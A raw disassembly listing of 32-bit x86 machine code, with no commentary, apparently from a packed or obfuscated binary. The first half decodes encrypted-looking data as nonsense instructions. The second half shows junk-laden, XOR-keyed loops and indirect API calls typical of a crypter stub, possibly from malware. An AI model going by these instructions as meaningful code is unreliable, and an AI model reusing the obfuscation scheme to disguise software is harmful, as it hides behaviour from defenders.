  4189ad:	ins    BYTE PTR es:[edi],dx
  4189ae:	in     al,0x14
  4189b0:	sub    al,0xd3
  4189b2:	xchg   edx,eax
  4189b3:	jae    0x418a2c
  4189b5:	pusha  
  4189b6:	adc    edi,DWORD PTR [ebp-0x3c8dba24]
  4189bc:	std    
  4189bd:	loope  0x41896b
  4189bf:	je     0x418991
  4189c1:	ret    
  4189c2:	sar    esp,cl
  4189c4:	mov    bl,BYTE PTR [esi+0x1c]
  4189c7:	test   BYTE PTR [edx+0x5969528e],dh
  4189cd:	out    dx,al
  4189ce:	xchg   ebp,eax
  4189cf:	mov    dh,0x7b
  4189d1:	jae    0x41895d
  4189d3:	ds int 0x28
  4189d6:	inc    esi
  4189d7:	out    dx,al
  4189d8:	mov    ch,0x61
  4189da:	test   al,0x6
  4189dc:	mov    edx,0x5103ce60
  4189e1:	fstp   DWORD PTR [ebp+0xa3fd133]
  4189e7:	mov    al,ds:0xb4194571
  4189ec:	(bad)  
  4189ee:	lock out dx,al
  4189f0:	inc    ebx
  4189f1:	push   cs
  4189f2:	test   BYTE PTR [esi-0x2a0b0f79],0x6b
  4189f9:	xor    al,0x7b
  4189fb:	jb     0x418a2e
  4189fd:	fild   QWORD PTR [ecx]
  4189ff:	mov    ecx,0x68c24534
  418a04:	fsub   st(3),st
  418a06:	jmp    0xe313:0x69f3b38
  418a0d:	out    dx,eax
  418a0e:	(bad)  
  418a0f:	iret   
  418a10:	cli    
  418a11:	xor    ebp,esi
  418a13:	jno    0x4189dc
  418a15:	mov    ebx,0x269e68a
  418a1a:	aad    0xc0
  418a1c:	xor    al,0xc
  418a1e:	mov    esi,DWORD PTR [ecx-0x39536aa7]
  418a24:	cld    
  418a25:	fwait
  418a26:	aas    
  418a27:	sbb    al,0xde
  418a29:	stos   DWORD PTR es:[edi],eax
  418a2a:	cld    
  418a2b:	les    eax,FWORD PTR [ebx-0x9]
  418a2e:	jecxz  0x418aa3
  418a30:	cmp    eax,0xd90f3f16
  418a35:	push   eax
  418a36:	aad    0xe0
  418a38:	les    ebx,FWORD PTR [edi+0x35]
  418a3b:	and    al,BYTE PTR [ecx+0x29b72768]
  418a41:	pushf  
  418a42:	sub    eax,0x1aa45d8e
  418a47:	mov    ecx,0xfae0cc39
  418a4c:	mov    esp,0x21460a58
  418a51:	call   0x29e1:0x39f10a54
  418a58:	add    al,0x4c
  418a5a:	shr    DWORD PTR [edx],0x39
  418a5d:	icebp  
  418a5e:	bound  esp,QWORD PTR [ebx-0x3a]
  418a61:	adc    BYTE PTR [edx+0x76],dh
  418a64:	bound  eax,QWORD PTR [eax+eiz*4+0xe]
  418a68:	das    
  418a69:	test   ebp,ecx
  418a6b:	pop    es
  418a6c:	retf   0xb651
  418a6f:	jmp    0x418ac3
  418a71:	xor    al,0x9e
  418a73:	stos   DWORD PTR es:[edi],eax
  418a74:	addr16 sbb al,0xe3
  418a77:	jp     0x418a79
  418a79:	lods   eax,DWORD PTR ds:[esi]
  418a7a:	jp     0x418ac6
  418a7c:	sub    esi,DWORD PTR [esp+edx*4-0x8ec7445]
  418a83:	sub    bh,BYTE PTR [edi]
  418a85:	ror    DWORD PTR [edi+ecx*1+0x1d],cl
  418a89:	jmp    DWORD PTR [ebp-0x8]
  418a8c:	shl    BYTE PTR [edx-0x7ae0f616],0xfa
  418a93:	dec    esp
  418a94:	adc    DWORD PTR [esi],ecx
  418a96:	aam    0x32
  418a98:	mov    dl,BYTE PTR [ebp-0x78]
  418a9b:	inc    esp
  418a9c:	stos   BYTE PTR es:[edi],al
  418a9d:	outs   dx,DWORD PTR ds:[esi]
  418a9e:	mov    eax,0x5b2d8bcb
  418aa3:	ret    0x42c3
  418aa6:	xchg   esp,eax
  418aa7:	xchg   eax,ecx
  418aa9:	out    dx,al
  418aaa:	mov    dh,0x34
  418aac:	add    bh,bh
  418aae:	xor    edx,ebp
  418ab0:	pop    es
  418ab1:	adc    al,0x7b
  418ab3:	data16 scas al,BYTE PTR es:[edi]
  418ab5:	mov    ?,WORD PTR [eax+0x2ddcde30]
  418abb:	mov    esi,0xd91a7714
  418ac0:	sbb    esi,0xffffffc5
  418ac3:	mov    ds,ebx
  418ac5:	xchg   ebx,eax
  418ac6:	and    al,0xf4
  418ac8:	push   ebx
  418ac9:	(bad)  
  418aca:	and    eax,0xe7a00848
  418acf:	mov    ecx,0x4048fa75
  418ad4:	mov    ecx,gs
  418ad6:	data16 clc 
  418ad8:	add    al,BYTE PTR [ebx]
  418ada:	ffreep st(6)
  418adc:	cmp    DWORD PTR [edi],edi
  418ade:	sbb    ah,BYTE PTR [ecx]
  418ae0:	dec    esp
  418ae1:	aam    0x76
  418ae3:	(bad)  
  418ae4:	idiv   DWORD PTR [ebx-0x5b249102]
  418aea:	adc    DWORD PTR [eax+0x4b301160],ecx
  418af0:	not    cl
  418af2:	stos   BYTE PTR es:[edi],al
  418af3:	dec    eax
  418af4:	dec    ebx
  418af5:	xchg   ecx,eax
  418af6:	retf   
  418af7:	cmp    edx,DWORD PTR [ebx]
  418af9:	addr16 push eax
  418afb:	pop    ebp
  418afc:	mov    ecx,0xdba31c6c
  418b01:	outs   dx,BYTE PTR ds:[esi]
  418b02:	int3   
  418b03:	inc    esi
  418b04:	ret    
  418b05:	daa    
  418b06:	push   es
  418b07:	push   ebp
  418b08:	pop    eax
  418b09:	rcr    BYTE PTR [eax],cl
  418b0b:	pop    esi
  418b0c:	in     al,0x17
  418b0e:	push   edx
  418b0f:	cwde   
  418b10:	jnp    0x418b8d
  418b12:	(bad)  
  418b13:	jae    0x418b4a
  418b15:	push   ebx
  418b16:	push   ebx
  418b17:	mov    bl,BYTE PTR [eax+eiz*8+0x6c340d5]
  418b1e:	jmp    0x5f1f7dba
  418b23:	and    DWORD PTR [edi],0xe3ea50c4
  418b29:	test   edi,0x9d3263f
  418b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b30:	xchg   esp,eax
  418b31:	(bad)  
  418b32:	call   0xd7ec8b96
  418b37:	mov    esi,0x22e69ee9
  418b3c:	mov    eax,edi
  418b3e:	or     al,0x7b
  418b40:	jb     0x418b2d
  418b42:	mov    ecx,esp
  418b44:	je     0x418bb8
  418b46:	out    dx,eax
  418b47:	or     cl,ah
  418b49:	repz mov edx,0x761bc3e
  418b4f:	xor    DWORD PTR [ebp+0x34],ebp
  418b52:	stos   DWORD PTR es:[edi],eax
  418b53:	(bad)  [edi]
  418b55:	sar    esi,1
  418b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b58:	dec    ebx
  418b59:	push   edi
  418b5a:	scas   eax,DWORD PTR es:[edi]
  418b5b:	lods   al,BYTE PTR ds:[esi]
  418b5c:	repnz cli 
  418b5e:	aaa    
  418b5f:	(bad)  
  418b60:	sti    
  418b61:	mov    dl,0x3
  418b63:	outs   dx,BYTE PTR ds:[esi]
  418b64:	mov    ebp,0x9bf49698
  418b69:	or     DWORD PTR [ecx+0x7f000c08],0x1c
  418b70:	xchg   esp,eax
  418b71:	mov    dl,0xf3
  418b73:	outs   dx,BYTE PTR ds:[esi]
  418b74:	addr16 (bad) 
  418b77:	and    ecx,eax
  418b79:	jmp    0x418be8
  418b7b:	mov    ch,0x13
  418b7d:	call   0x5cbf:0x4e8fb71f
  418b84:	inc    ebp
  418b85:	(bad)  
  418b86:	test   DWORD PTR [ebx-0x5e2087f7],edi
  418b8c:	or     edx,DWORD PTR [esi]
  418b8e:	aam    0x3b
  418b90:	push   edi
  418b91:	sub    ecx,DWORD PTR [ebx]
  418b93:	loope  0x418b66
  418b95:	push   ds
  418b96:	mov    esp,0x16a2516c
  418b9b:	cmc    
  418b9c:	inc    eax
  418b9d:	pop    es
  418b9e:	mov    ebx,0xf97a8842
  418ba3:	outs   dx,DWORD PTR ds:[esi]
  418ba4:	shl    DWORD PTR [si-0x72],0x14
  418ba9:	add    eax,0xf95fe3c8
  418bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418baf:	(bad)  
  418bb0:	dec    ebx
  418bb1:	push   0x9b113d3c
  418bb6:	mov    dl,0x44
  418bb8:	ret    
  418bb9:	mov    ds:0x381f60c0,eax
  418bbe:	stos   BYTE PTR es:[edi],al
  418bbf:	xchg   BYTE PTR [ebx-0x6],bh
  418bc2:	adc    al,0x1a
  418bc4:	cli    
  418bc5:	int    0xd8
  418bc7:	sbb    DWORD PTR [eax+0x30],0xdc1eec4a
  418bce:	repz pop ebx
  418bd0:	mov    ch,0x16
  418bd2:	cmp    bl,al
  418bd4:	enter  0x86e7,0x80
  418bd8:	popf   
  418bd9:	lea    si,[ebp-0x6f]
  418bdd:	(bad)  
  418bdf:	add    al,0xb5
  418be1:	push   ebx
  418be2:	mov    ebx,0x7c69ccbd
  418be7:	into   
  418be8:	pop    edi
  418be9:	sti    
  418bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418beb:	dec    ecx
  418bec:	sbb    bh,BYTE PTR [ecx]
  418bee:	fsubr  st,st(3)
  418bf0:	mov    esi,0x554986ae
  418bf5:	push   esp
  418bf6:	add    eax,0x6b0ee396
  418bfb:	mov    BYTE PTR fs:[eax+0x7e92831d],al
  418c02:	(bad)  
  418c03:	repz push esi
  418c05:	bound  cx,DWORD PTR [edx]
  418c08:	call   0x89ba:0x47479d5
  418c0f:	xchg   ebx,eax
  418c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c11:	cld    
  418c12:	imul   esi,ebx,0xccf8408e
  418c18:	test   BYTE PTR [edx],bh
  418c1a:	fwait
  418c1b:	rcr    DWORD PTR [ebp+0x3a4f6a30],0xc3
  418c22:	sbb    DWORD PTR [ecx+edx*8-0x32],ebp
  418c26:	fisubr WORD PTR [esi]
  418c28:	fidiv  WORD PTR [edi-0x48]
  418c2b:	pop    eax
  418c2c:	je     0x418bd4
  418c2e:	mov    edi,esi
  418c30:	fld    TBYTE PTR [ebp-0x79618e2b]
  418c36:	inc    eax
  418c37:	jle    0x418bfc
  418c39:	out    dx,al
  418c3a:	repz ja 0x418c05
  418c3d:	jb     0x418c9e
  418c3f:	sbb    al,cl
  418c41:	ins    BYTE PTR es:[edi],dx
  418c42:	mov    esp,0x453ea2c1
  418c47:	rol    DWORD PTR [ecx+0x6a6b2eb2],1
  418c4d:	dec    ebx
  418c4e:	cmp    edi,DWORD PTR [eax-0x66]
  418c51:	out    dx,al
  418c52:	mov    esi,0xe4989749
  418c57:	out    dx,eax
  418c58:	nop
  418c59:	xchg   edx,eax
  418c5a:	outs   dx,BYTE PTR ds:[esi]
  418c5b:	mov    cl,0xda
  418c5d:	add    bl,BYTE PTR [esi]
  418c5f:	cmc    
  418c60:	fcmovu st,st(7)
  418c62:	jbe    0x418bef
  418c64:	or     bh,BYTE PTR [ebp-0x74]
  418c67:	ins    DWORD PTR es:[edi],dx
  418c68:	cmp    edi,ebx
  418c6a:	sub    eax,0xa46f582a
  418c6f:	std    
  418c70:	sub    eax,DWORD PTR [eax-0x75]
  418c73:	xchg   ebx,eax
  418c74:	rcl    DWORD PTR ds:0xb5f75f79,0xcb
  418c7b:	add    esp,DWORD PTR [eax-0x37]
  418c7e:	add    eax,0xb5b2c063
  418c83:	jns    0x418cfe
  418c85:	test   al,0xbc
  418c87:	sbb    ebx,DWORD PTR [edi+0x22]
  418c8a:	mov    ds:0xe32b9cf6,al
  418c8f:	(bad)  
  418c90:	dec    edx
  418c91:	cld    
  418c92:	fst    QWORD PTR [ecx]
  418c94:	jp     0x418cd6
  418c96:	cld    
  418c97:	stos   BYTE PTR es:[edi],al
  418c98:	inc    eax
  418c99:	jle    0x418c5c
  418c9b:	jne    0x418cbf
  418c9d:	int3   
  418c9e:	sbb    BYTE PTR [ecx-0x464aa248],bh
  418ca4:	xor    eax,0xed13ce1e
  418ca9:	shl    ebx,cl
  418cab:	and    ah,BYTE PTR [edx+0x6cadb179]
  418cb1:	loope  0x418d0d
  418cb3:	add    dh,0x9e
  418cb6:	leave  
  418cb7:	mov    edi,0xe518e8f
  418cbc:	rcl    BYTE PTR [ecx-0x22],1
  418cbf:	dec    ebp
  418cc0:	pop    esi
  418cc1:	(bad)  
  418cc2:	and    ebp,eax
  418cc4:	sahf   
  418cc5:	fidivr WORD PTR [eax]
  418cc7:	out    0x93,eax
  418cc9:	sub    DWORD PTR [esi+0x52],esp
  418ccc:	add    bh,BYTE PTR [edx+0x17]
  418ccf:	sub    al,0x59
  418cd1:	mov    ds:0x71247d19,al
  418cd6:	pusha  
  418cd7:	imul   BYTE PTR [ebp-0x7ebaed23]
  418cdd:	outs   dx,BYTE PTR gs:[esi]
  418cdf:	adc    ebp,esi
  418ce1:	add    eax,0xdc371fcc
  418ce6:	and    ch,dh
  418ce8:	cs mov al,0xa2
  418ceb:	jo     0x418d36
  418ced:	(bad)  
  418cee:	ror    DWORD PTR [esi],0x10
  418cf1:	mov    ah,BYTE PTR [eax+0x6e]
  418cf4:	rol    BYTE PTR [ecx+ebx*1+0x6b5e691d],1
  418cfb:	push   esp
  418cfc:	xor    eax,0x536d9e4e
  418d01:	mov    bl,0x87
  418d03:	dec    DWORD PTR [eax]
  418d05:	add    BYTE PTR [edx-0x6c],bl
  418d08:	inc    edi
  418d09:	cli    
  418d0a:	push   edi
  418d0b:	push   eax
  418d0c:	scas   eax,DWORD PTR es:[edi]
  418d0d:	call   0x208a0069
  418d12:	fistp  QWORD PTR [esi-0xa]
  418d15:	aas    
  418d16:	mov    fs,WORD PTR [ebx]
  418d18:	mov    ebx,0xece1cea4
  418d1d:	shl    BYTE PTR [edx+esi*1-0x47],cl
  418d21:	xchg   ebp,eax
  418d22:	neg    BYTE PTR [edx]
  418d24:	pop    esi
  418d25:	jmp    0x418cc6
  418d27:	or     BYTE PTR [edx],ah
  418d29:	test   al,0xfa
  418d2b:	add    DWORD PTR [ecx+0x29d33fc2],esp
  418d31:	loope  0x418d2e
  418d33:	dec    esp
  418d34:	inc    BYTE PTR [edi+0x11b57d75]
  418d3a:	dec    ebp
  418d3b:	add    eax,0x87f1f729
  418d40:	mov    ds:0xf1922f52,al
  418d45:	xlat   BYTE PTR ds:[ebx]
  418d46:	in     al,dx
  418d47:	in     al,0xf4
  418d49:	inc    ebp
  418d4a:	mov    eax,ds:0xe347bdde
  418d4f:	jmp    0x7a31f742
  418d54:	inc    esi
  418d55:	ret    0x86a1
  418d58:	and    al,BYTE PTR [ebp+ebp*2+0x541c3835]
  418d5f:	imul   ebx,DWORD PTR ds:0xac13d39f,0x77
  418d66:	arpl   bx,ax
  418d68:	pop    ss
  418d69:	mov    ds:0x3c64135,eax
  418d6e:	jmp    0x418cf8
  418d70:	mov    ch,0x9a
  418d72:	jge    0x418da6
  418d74:	mov    ds:0x4b79a439,al
  418d79:	cmp    dh,BYTE PTR [eax+0x7c]
  418d7c:	mov    ecx,0x79f1e5c3
  418d81:	retf   
  418d82:	mov    al,ds:0x4a6757d5
  418d87:	sbb    al,0x7e
  418d89:	pop    ebp
  418d8a:	jae    0x418d8f
  418d8c:	add    eax,DWORD PTR [esi+0x3d6dfd69]
  418d92:	scas   eax,DWORD PTR es:[edi]
  418d93:	rcl    BYTE PTR [edi+0x2b],0xe
  418d97:	ret    
  418d98:	int    0xe2
  418d9a:	inc    esi
  418d9b:	mov    edi,0x24ae3a83
  418da0:	lods   al,BYTE PTR ds:[esi]
  418da1:	xor    eax,0xf781c3b8
  418da6:	repz or esp,esp
  418da9:	clc    
  418daa:	mov    bh,0xd8
  418dac:	adc    BYTE PTR [esp+ebx*1-0x43],dl
  418db0:	jecxz  0x418d97
  418db2:	aas    
  418db3:	jmp    0x418d4a
  418db5:	stc    
  418db6:	leave  
  418db7:	xchg   ebp,eax
  418db8:	in     al,0xa1
  418dba:	lods   al,BYTE PTR ds:[esi]
  418dbb:	mov    bl,0x5e
  418dbd:	out    dx,al
  418dbe:	inc    eax
  418dbf:	daa    
  418dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dc1:	test   eax,0x7ff2d320
  418dc6:	loop   0x418db3
  418dc8:	fwait
  418dc9:	arpl   WORD PTR ds:0x41aef69a,bx
  418dcf:	jle    0x418da5
  418dd1:	cmp    edx,ecx
  418dd3:	lods   eax,DWORD PTR ds:[esi]
  418dd4:	cld    
  418dd5:	dec    ebp
  418dd6:	or     edi,DWORD PTR [ebx-0x42]
  418dd9:	sbb    ch,BYTE PTR [esp+edi*1+0x501b10c8]
  418de0:	fs mov ebx,0xd93827b7
  418de6:	popf   
  418de7:	sub    BYTE PTR [esi+0x6daa5b78],bl
  418ded:	jecxz  0x418e16
  418def:	pop    ebp
  418df0:	arpl   WORD PTR [esi-0x3ecaa499],di
  418df6:	sub    DWORD PTR [edi],ebx
  418df8:	and    ch,cl
  418dfa:	jecxz  0x418e16
  418dfc:	xchg   ebx,eax
  418dfd:	dec    edi
  418dfe:	stc    
  418dff:	add    al,0x26
  418e01:	cmp    eax,0xa9c9d698
  418e06:	xor    esi,ecx
  418e08:	mov    edx,DWORD PTR ss:[ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9cf
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42a9d3
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
